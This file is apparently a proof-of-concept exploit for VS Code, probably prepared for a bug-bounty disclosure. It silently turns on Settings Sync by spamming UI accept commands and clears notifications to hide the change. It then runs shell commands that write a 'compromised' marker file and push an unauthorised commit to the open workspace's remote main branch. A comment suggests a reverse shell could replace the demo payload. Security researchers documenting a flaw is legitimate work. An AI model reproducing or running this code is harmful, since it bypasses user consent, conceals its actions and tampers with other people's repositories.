const vscode = require('vscode');
const child_process = require('child_process');

  // Activate the Sync settings automatically
  const ACCEPT_SELECTED_QUICK_PICKER_SPAM_TIMEOUT = 2500;
  const activateSyncSettings = () =>
    new Promise((resolve) => {
      vscode.commands.executeCommand('workbench.userDataSync.actions.turnOn');
      let i = 0;
      const id = setInterval(() => {
        vscode.commands.executeCommand(
          'workbench.action.acceptSelectedQuickOpenItem' // Stupid spamming
        );
        i++;
        if (i === ACCEPT_SELECTED_QUICK_PICKER_SPAM_TIMEOUT) {
          clearInterval(id);
          resolve(true);
        }
      }, 1);
    });

  // Hide the notification informing the user that the Sync Settings is on
  const CLEAR_NOTIFICATIONS_SPAM_TIMEOUT = 10000;
  const clearNotifications = () =>
    new Promise((resolve) => {
      let i = 0;
      const id = setInterval(() => {
        vscode.commands.executeCommand('notifications.clearAll'); // Stupid spamming
        i++;
        if (i === CLEAR_NOTIFICATIONS_SPAM_TIMEOUT) {
          clearInterval(id);
          resolve(true);
        }
      }, 1);
    });

  // this exploit creates a /tmp/hackerOne file on the system running vscode and open it in vscode
  // while this is for demonstration purpose, everything imaginable could be implemented (reverse shell etc...)
  const runExploit = async () => {
    child_process.execSync(
      `echo 'If you read this it means your system has been compromised.' > /tmp/hackerOne`
    );

    const openPath = vscode.Uri.file('/tmp/hackerOne');
    const file = await vscode.workspace.openTextDocument(openPath);
    vscode.window.showTextDocument(file);

    // let's push a malicious commit to the repository as well.
    let workspaceFolders = vscode.workspace.workspaceFolders;
    if (workspaceFolders && workspaceFolders.length) {
        const opts = { cwd: workspaceFolders[0].uri.fsPath };
        // this may fail if we don't have permissions
        try {
            child_process.execSync('git fetch origin', opts);
            child_process.execSync('git checkout origin/main -b hack', opts);
            child_process.execSync(`git commit -m 'malicious commit ts: ${(new Date).getTime()}' --allow-empty`, opts);
            child_process.execSync('git push origin hack:main', opts);
        } catch (e) {}
    }
  };

  (async () => {
    activateSyncSettings(); // Step 1: we activate the sync settings
    clearNotifications(); // Step 2: we cleared the notifications of sync settings activations
    runExploit(); // Step 3: we run the exploit
  })();